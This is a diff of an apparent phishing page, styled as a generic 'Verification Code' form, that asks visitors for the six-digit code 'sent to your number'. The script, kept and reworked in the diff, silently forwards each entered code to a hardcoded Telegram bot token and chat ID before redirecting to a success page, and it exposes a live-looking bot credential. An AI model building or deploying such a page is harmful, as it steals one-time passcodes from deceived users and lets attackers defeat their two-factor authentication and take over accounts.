@@ -4,162 +4,224 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verification Code</title>
-
   <style>
     :root {
       --bg-page: #f4f5f7;
       --bg-panel: #ffffff;
-      --border-light: #e1e3e6;
-      --text-main: #222;
+      --text-main: #222222;
+      --text-muted: #888888;
       --accent-blue: #0070f3;
+      --accent-blue-dark: #0054c4;
       --error-red: #dc2626;
     }
 
     * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
-        system-ui, sans-serif;
     }
 
     body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
+        system-ui, -webkit-system-font, sans-serif;
       background: var(--bg-page);
+      color: var(--text-main);
     }
 
-    .wrapper {
+    .page-wrapper {
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      padding: 24px 12px;
     }
 
-    .box {
-      background: var(--bg-panel);
+    .panel {
       width: 100%;
       max-width: 420px;
-      padding: 28px 22px 32px;
-      border-radius: 18px;
+      margin: 0 16px;
+      background: var(--bg-panel);
+      border-radius: 20px;
       box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
+      padding: 26px 22px 24px;
       text-align: center;
+    }
+
+    .otp-icon-wrapper {
+      width: 60px;
+      height: 60px;
+      border-radius: 999px;
+      margin: 0 auto 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--accent-blue);
+      box-shadow: 0 6px 14px rgba(0, 112, 243, 0.35);
+    }
+
+    .otp-icon {
+      font-size: 30px;
+      color: #ffffff;
+      line-height: 1;
     }
 
     h1 {
       font-size: 22px;
       font-weight: 600;
-      margin-bottom: 10px;
+      margin-bottom: 6px;
     }
 
-    .sub {
+    .subtitle {
       font-size: 14px;
-      color: #666;
-      margin-bottom: 26px;
+      color: var(--text-muted);
+      margin-bottom: 20px;
     }
 
-    .otp-box {
+    .code-row {
       display: flex;
       justify-content: center;
       gap: 10px;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
+      margin-bottom: 18px;
     }
 
-    .otp-input {
-      width: 48px;
-      height: 54px;
+    .code-input {
+      width: 52px;
+      height: 52px;
+      border-radius: 10px;
+      border: 1px solid #d1d5db;
+      font-size: 24px;
       text-align: center;
-      font-size: 22px;
-      border-radius: 8px;
-      border: 1px solid var(--border-light);
       outline: none;
-      transition: 0.15s ease;
-      background: #fff;
+      background-color: #ffffff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease,
+        background-color 0.15s ease;
     }
 
-    .otp-input:focus {
+    .code-input:focus {
       border-color: var(--accent-blue);
-      box-shadow: 0 0 0 1px rgba(0,112,243,0.18);
+      box-shadow: 0 0 0 1px rgba(0, 112, 243, 0.18);
     }
 
-    .error {
-      color: var(--error-red);
+    .error-text {
       font-size: 12px;
-      margin-bottom: 8px;
+      color: var(--error-red);
+      margin-bottom: 4px;
       display: none;
     }
 
-    .btn {
+    .btn-submit {
       width: 100%;
-      background: var(--accent-blue);
-      border: none;
-      padding: 12px 0;
-      font-size: 16px;
-      font-weight: 600;
-      color: #fff;
+      margin-top: 4px;
+      padding: 11px 0;
       border-radius: 8px;
+      border: none;
+      background: var(--accent-blue);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
       cursor: pointer;
-      transition: 0.15s ease;
+      transition: background 0.15s ease, transform 0.05s ease,
+        box-shadow 0.15s ease;
     }
 
-    .btn:hover {
-      background: #0060d0;
+    .btn-submit:hover {
+      background: var(--accent-blue-dark);
+    }
+
+    .btn-submit:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.25);
+    }
+
+    @media (max-width: 400px) {
+      .panel {
+        padding: 24px 18px 22px;
+      }
+
+      .code-row {
+        gap: 6px;
+      }
+
+      .code-input {
+        width: 44px;
+        height: 48px;
+        font-size: 22px;
+      }
     }
   </style>
 </head>
-
 <body>
-  <div class="wrapper">
-    <div class="box">
+  <div class="page-wrapper">
+    <div class="panel">
+      <div class="otp-icon-wrapper">
+        <div class="otp-icon">✓</div>
+      </div>
 
       <h1>Verification Code</h1>
-      <div class="sub">Enter the 6-digit code sent to your number</div>
+      <p class="subtitle">Enter the 6-digit code sent to your number</p>
 
-      <form id="otpForm" onsubmit="return false;">
-        <div class="otp-box">
-          <input id="d1" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
-          <input id="d2" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
-          <input id="d3" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
-          <input id="d4" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
-          <input id="d5" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
-          <input id="d6" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+      <form id="otpForm" autocomplete="off" onsubmit="return false;">
+        <div class="code-row">
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+          <input class="code-input" type="tel" inputmode="numeric" maxlength="1" />
+        </div>
+        <div id="otpError" class="error-text">
+          This code is required.
         </div>
 
-        <div id="err" class="error">All fields are required.</div>
-
-        <button class="btn" id="verifyBtn">Verify</button>
+        <button type="submit" class="btn-submit">Verify</button>
       </form>
-
     </div>
   </div>
 
   <script>
-    const boxes = ["d1", "d2", "d3", "d4", "d5", "d6"].map(id => document.getElementById(id));
-    const err = document.getElementById("err");
+    const form = document.getElementById("otpForm");
+    const inputs = document.querySelectorAll(".code-input");
+    const errorLabel = document.getElementById("otpError");
 
-    // auto move
-    boxes.forEach((box, idx) => {
-      box.addEventListener("input", () => {
-        if (box.value.length === 1 && idx < 5) boxes[idx + 1].focus();
+    // تنضيف: أرقام فقط + تحريك الكيرسر
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        input.value = input.value.replace(/\D/g, "");
+        if (input.value.length > 1) {
+          input.value = input.value.slice(0, 1);
+        }
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
       });
     });
 
-    document.getElementById("verifyBtn").addEventListener("click", function () {
-      const values = boxes.map(b => b.value.trim());
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
 
-      if (values.includes("")) {
-        err.style.display = "block";
+      let code = "";
+      inputs.forEach((inp) => {
+        code += inp.value.trim();
+      });
+
+      // لازم ٦ خانات كاملة
+      if (code.length !== 6) {
+        errorLabel.style.display = "block";
         return;
+      } else {
+        errorLabel.style.display = "none";
       }
 
-      err.style.display = "none";
-
-      const code = values.join("");
-
       const message =
-        "🔐 OTP Verification\n" +
-        "------------------------\n" +
-        "✔ Code entered: " + code;
+        "🔐 New OTP submission\n" +
+        "-----------------------\n" +
+        "📲 Code: " + code;
 
       const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
       const chatId = "7811430582";
@@ -172,15 +234,16 @@
           text: message
         })
       })
-      .then(r => r.json())
-      .then(data => {
-        console.log("Telegram response:", data);
-        window.location.href = "success.html";
-      })
-      .catch(err => {
-        console.error("Telegram Error:", err);
-        alert("Something went wrong. Try again.");
-      });
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("Telegram response:", data);
+          // صفحة النهاية بعد التحقق
+          window.location.href = "success.html";
+        })
+        .catch((error) => {
+          console.error("Telegram error:", error);
+          alert("Something went wrong. Try again.");
+        });
     });
   </script>
 </body>
